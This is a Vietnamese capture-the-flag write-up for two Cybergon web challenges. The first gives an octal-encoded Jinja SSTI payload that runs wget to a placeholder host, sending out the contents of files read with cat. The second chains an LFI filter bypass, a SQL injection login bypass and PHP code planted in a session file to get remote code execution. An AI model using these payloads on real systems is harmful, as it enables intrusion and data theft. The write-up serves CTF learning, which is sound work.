Website: https://cybergon.ctfd.io/challenges
# Web
## 1. Flappy Block v2
Website bị lỗi SSTI ở path `https://cybergon-flappy-block.chals.io/image?text={{ssti_payload}}`.

Nhận thấy website có những cơ chế sau:

+) Blacklist `_` `.` `|` `x`

+) Blacklist keywords `config`

+) Chuyển đổi ký tự: r->w, R->W, l->w, L->W, u->yu, U->yU

Do đó, hầu hết các attack vector đều đã bị chặn.

Solution: octal encoding

```
https://cybergon-flappy-block.chals.io/image?text={{%27%27[%27\137\137\143\154\141\163\163\137\137%27][%27\137\137\155\162\157\137\137%27][1][%27\137\137\163\165\142\143\154\141\163\163\145\163\137\137%27]()[140][%27\137\137\151\156\151\164\137\137%27][%27\137\137\147\154\157\142\141\154\163\137\137%27][%27popen%27](%27wget%20https://yourwebsitehere?d=`cat%20/*`%27)}}
```

Kinh nghiệm: Sử dụng octal encoding để bypass character blocking. Bài này mình đã mất rất nhiều thời gian tìm payload vòng tránh, các hàm chuyển đổi, các encoding như UTF-8 UTF-16 nhưng không được. Cuối cùng solution lại là octal encoding, rất phổ biến.

## 2. Cybergon's Blog
Website có form login và tiết lộ rằng có tài khoản `user:user`

![image](https://github.com/n0bitaemon/CTF-writeup/assets/103978452/58e108ff-4a5e-4905-bfcb-6dc9d10a31d0)

Sau khi login, ta thấy có path `https://cybergon-blog.chals.io/post.php?view=firstpost.md`. Tham số `view` có cơ chế phòng chống LFI bằng cách xóa các ký tự như `../`, `flag`, `passwd`, `var`, ...

Tuy nhiên, ta có thể bypass bằng cách dùng payload: `https://cybergon-blog.chals.io/post.php?view=....//....//....//....//etc/passpassswdwd`

![image](https://github.com/n0bitaemon/CTF-writeup/assets/103978452/ac8e972b-eca5-491e-9cba-a7834164d37d)

Tiếp theo cần tìm cách lấy tên file flag. Thử đọc file `/proc/self/fd/10` thì thấy có user session được lưu:

![image](https://github.com/n0bitaemon/CTF-writeup/assets/103978452/b870180f-112b-46f1-9b3c-1fcd1530dce3)

Như vậy, nếu có thể thay chèn PHP payload vào session thì ta có thể thực thi RCE. Nhận thấy không thể chèn php payload vào tham số `theme`.

Trong trang login, thử nhập username `user'` thì có lỗi `Wrong username/password combination.`. Nhưng khi nhập username `user"` thì có lỗi `User not exist, please register to continue!`. Thay với payload `user" or "1"="1` thì thấy login thành công. Như vậy ở đây có lỗi SQL injection.

Đăng nhập với username sau: `<?php echo 'triet' ?>" or "1"="1" limit 1 --`
Sau khi thành công, dùng LFI đọc file `/proc/self/fd/10`, ta thấy:

![image](https://github.com/n0bitaemon/CTF-writeup/assets/103978452/030dad59-f9c7-4b91-b81a-9435fdb298ca)

Như vậy ta đã RCE thành công => đọc flag thôi!

*Kinh nghiệm: Lợi dụng LFI đọc status của process (/proc/self/...)*
